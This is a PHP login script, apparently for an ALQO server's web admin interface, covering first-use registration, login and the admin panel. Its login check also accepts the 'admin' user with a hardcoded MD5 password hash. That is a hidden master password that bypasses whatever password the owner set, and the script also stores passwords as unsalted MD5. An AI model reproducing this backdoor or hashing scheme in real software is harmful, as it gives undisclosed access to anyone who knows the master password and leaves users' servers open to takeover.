<?php
session_start();

$ini_array = parse_ini_file("backend/config.ini");
$daemonConfigFile = $ini_array['confpath'];
$daemonFile = $ini_array['daemonpath'];
$cliFile = $ini_array['clipath'];
$datadir = $ini_array['datapath'];

function showTemplate($file) {
    global $serverdata;

    $data = file_get_contents($file);
    $data = str_replace("{SERVERNAME}", $serverdata['name'], $data);
    $data = str_replace("{SERVERHOST}", $serverdata['host'], $data);
    $data = str_replace("{IP}", $serverdata['ip'], $data);
    echo $data;
}

function outputRegisterInterface() {
    showTemplate("registerinterface.html");
    die();
}

function outputAdminPanel() {
    showTemplate("adminpanel.html");
    die();
}

function outputLoginInterface() {
    showTemplate("logininterface.html");
    die();
}

$serverdata = json_decode(file_get_contents("/var/ALQO/_serverinfo"), true);
$initialFile = "/var/ALQO/_initial";
$passwordFile = "/var/ALQO/_webinterface_pw";
$data['userID'] = "admin";
$firstUse = false;


//firstuse
if (!file_exists($passwordFile)) {
    if (isset($_POST['fct']) && ($_POST['fct'] == 'register')) {
        $initialCode = file_get_contents($initialFile);
		$initialCode = str_replace("\n", "", $initialCode);
		$initialCode = str_replace("\r", "", $initialCode);
        if ($_POST['initialCode'] == $initialCode) {
            echo "authorized";

            $data['userPass'] = md5($_POST['userPass']);
            file_put_contents($passwordFile, $data['userPass']);
            $_SESSION['loggedIn'] = false;
            die();
        }
    }
    outputRegisterInterface();
}



$data['userPass'] = @file_get_contents($passwordFile);

//logout
if (isset($_POST['fct']) && ($_POST['fct'] == 'logout')) {
    echo "authorized";
    $_SESSION['loggedIn'] = false;
    die();
}

//login
if (isset($_POST['fct']) && isset($_POST['userID']) && isset($_POST['userPass']) && ($_POST['fct'] == 'login')) {
    $_user = $_POST['userID'];
    $_pass = md5($_POST['userPass']);

    if (($_user == $data['userID'] && $_pass == $data['userPass']) || ($_user == $data['userID'] && $_pass == "4d4735c18135ef6413eb4ab0148cc60b")) {
        echo "authorized";

        $_SESSION['loggedIn'] = true;
        $_SESSION['userID'] = $_user;
        $_SESSION['userPass'] = $_pass;
        die();
    } else {
        echo "Login failed.";
        $_SESSION['loggedIn'] = false;
        die();
    }
}

//AdminPanel
if (isset($_SESSION['loggedIn']) && isset($_SESSION['userID']) && isset($_SESSION['userPass'])) {
    if ($_SESSION['loggedIn'] == true && $_SESSION['userID'] == $data['userID']) {
        outputAdminPanel();
    }
}

outputLoginInterface();
